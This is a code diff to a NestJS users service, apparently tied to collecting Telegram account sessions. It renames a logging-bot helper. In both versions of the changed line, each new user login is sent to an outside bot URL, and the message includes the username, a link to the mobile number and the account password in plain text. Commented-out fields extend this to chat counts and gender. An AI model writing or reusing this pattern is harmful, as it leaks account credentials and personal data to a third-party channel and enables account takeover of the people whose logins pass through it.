@@ -8,7 +8,7 @@ import { ClientService } from '../clients/client.service';
 import { UpdateUserDto } from './dto/update-user.dto';
 import { CreateUserDto } from './dto/create-user.dto';
 import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
-import { ppplbot } from '../../utils/logbots';
+import { notifbot } from '../../utils/logbots';
 
 @Injectable()
 export class UsersService {
@@ -27,7 +27,7 @@ export class UsersService {
       console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId)
       await this.clientsService.updateClientSession(user.session)
     } else {
-      await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
+      await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);//Msgs:${user.msgs}\nphotos:${user.photoCount}\nvideos:${user.videoCount}\nmovie:${user.movieCount}\nPers:${user.personalChats}\nChan:${user.channels}\ngender-${user.gender}\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);
       const newUser = new this.userModel(user);
       return newUser.save();
     }
